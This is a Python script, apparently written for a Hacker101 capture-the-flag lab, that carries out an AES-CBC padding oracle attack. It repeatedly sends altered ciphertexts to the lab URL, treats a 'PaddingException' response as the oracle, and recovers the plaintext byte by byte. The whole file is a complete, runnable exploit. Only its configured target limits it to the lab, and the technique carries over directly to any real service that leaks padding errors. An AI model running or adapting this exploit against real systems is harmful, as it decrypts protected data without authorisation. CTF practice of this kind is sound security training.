#!/usr/bin/env python3
"""
AES-CBC Padding Oracle Attack Tool

Oracle rule for this lab:
  invalid AES padding -> response contains "PaddingException"
  valid padding       -> anything else (often a json.loads traceback)
"""

import base64
import requests
from urllib.parse import quote

# ==================== CONFIG ====================
TARGET_URL = "https://176c6fb4291841b27c85c9e2f3074b6c.ctf.hacker101.com/"
ENCODED_CT = "0d3LkNu!0xvTuDidJ8q7uN6nztiy1BzAw-5C7TOXGy3erd6P0neBrKwbbRioem3DifWppYf5wbEr5YQ9u-!sW9FEJ2BPKxxgNPHGLxyQM1ELjqeBYnAv-Q1fEtRDcNKtiEdEGzglhtSx3!20E6ald-RxQ!bp7FDdXmgFl4ujw3eOWHAqbncz9z5KNLNwUXikmmV9ARqb88Rhc3L7Tux5hg~~"

DEBUG = False

def custom_b64_decode(data: str) -> bytes:
    data = data.replace("-", "+").replace("!", "/").replace("~", "=")
    pad = len(data) % 4
    if pad:
        data += "=" * (4 - pad)
    return base64.b64decode(data)

def custom_b64_encode(data: bytes) -> str:
    s = base64.b64encode(data).decode()
    return s.replace("+", "-").replace("/", "!").replace("=", "~")

def is_valid_padding(ciphertext: bytes) -> bool:
    encoded = custom_b64_encode(ciphertext)
    url = f"{TARGET_URL}?post={quote(encoded, safe='')}"
    try:
        r = requests.get(url, timeout=10)
        if DEBUG:
            print(f"  [debug] {r.status_code} | {r.text[:200].replace(chr(10), ' ')}")
        return "PaddingException" not in r.text
    except Exception as e:
        if DEBUG:
            print(f"  [debug] exception: {e}")
        return False

BLOCK = 16

def attack_block(prev_block: bytes, target_block: bytes) -> bytes:
    intermediate = bytearray(BLOCK)
    plaintext = bytearray(BLOCK)

    for pad_len in range(1, BLOCK + 1):
        prefix = bytearray(prev_block)
        for i in range(1, pad_len):
            prefix[-i] = intermediate[-i] ^ pad_len

        found = False
        for guess in range(256):
            prefix[-pad_len] = guess
            test_ct = bytes(prefix) + target_block
            if is_valid_padding(test_ct):
                intermediate[-pad_len] = guess ^ pad_len
                plaintext[-pad_len] = intermediate[-pad_len] ^ prev_block[-pad_len]
                found = True
                print(f"    byte {BLOCK - pad_len}: {plaintext[-pad_len]:02x}")
                break
        if not found:
            raise RuntimeError(
                f"Failed at padding length {pad_len}. "
                "Instance may be dead (404) or TARGET_URL/ENCODED_CT is wrong."
            )

    return bytes(plaintext)

def decrypt(ciphertext: bytes) -> bytes:
    if len(ciphertext) % BLOCK != 0:
        raise ValueError("Ciphertext length must be multiple of block size")

    iv = ciphertext[:BLOCK]
    blocks = [ciphertext[i:i + BLOCK] for i in range(BLOCK, len(ciphertext), BLOCK)]

    plaintext = b""
    prev = iv
    for i, block in enumerate(blocks):
        print(f"[*] Decrypting block {i + 1}/{len(blocks)} ...")
        pt_block = attack_block(prev, block)
        plaintext += pt_block
        prev = block
        print(f"    -> {pt_block!r}")

    pad = plaintext[-1]
    if 1 <= pad <= BLOCK and plaintext.endswith(bytes([pad]) * pad):
        plaintext = plaintext[:-pad]
    return plaintext

if __name__ == "__main__":
    print("[*] Decoding ciphertext...")
    ct = custom_b64_decode(ENCODED_CT)
    print(f"[+] Ciphertext length: {len(ct)} bytes")

    print("[*] Starting padding-oracle attack...")
    pt = decrypt(ct)
    print("\n[+] Recovered plaintext:")
    print(pt.decode(errors="replace"))
